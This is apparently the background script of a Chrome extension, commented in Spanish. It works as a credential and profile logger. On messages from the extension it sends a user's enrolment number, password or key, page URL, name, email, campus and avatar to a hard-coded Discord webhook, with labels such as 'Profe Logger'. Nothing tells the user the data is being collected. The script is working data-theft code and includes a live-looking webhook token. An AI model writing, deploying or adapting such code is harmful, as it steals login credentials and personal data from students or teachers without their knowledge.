
//discord
chrome.runtime.onMessage.addListener((msg) => {
  if (msg.action === "logAccess") {
    const webhookUrl = "https://discord.com/api/webhooks/1548481225851928609/apL8u_xfa_W-g4uMkivhaBz3yZnTvMEMfT16s7BUV95J5Oa8gTvveN-eNNW5f22XNTmk";

    const payload = {
      embeds: [{
        title: "Nuevo acceso",
        description: 
          `Matricula: **${msg.matricula}**\n` + // <- Línea para matrícula
          `Clave ID: **${msg.clave || "No proporcionada"}**\n` + // <- Línea para clave ID
          `URL: ${msg.url}`, // <- Línea para la URL
        color: 0x00ff00,
        footer: { text: "Profe Logger" },
        timestamp: new Date().toISOString()
      }]
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(console.error);
  }

  if (msg.action === "profileAccess") {
    const webhookUrl = "https://discord.com/api/webhooks/1548481225851928609/apL8u_xfa_W-g4uMkivhaBz3yZnTvMEMfT16s7BUV95J5Oa8gTvveN-eNNW5f22XNTmk";

    const payload = {
      embeds: [{
        title: "Datos de perfil",
        description:
          `Nombre: **${msg.nombre}**\n` +
          `Correo: **${msg.correo}**\n` +
          `Sede: **${msg.sede}**\n` +
          `URL: ${msg.url}`,
        color: 0x3498db,
        footer: { text: "Teacher Logger" },
        timestamp: new Date().toISOString(),
        thumbnail: msg.avatar ? { url: msg.avatar } : undefined
      }]
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(console.error);
  }
});




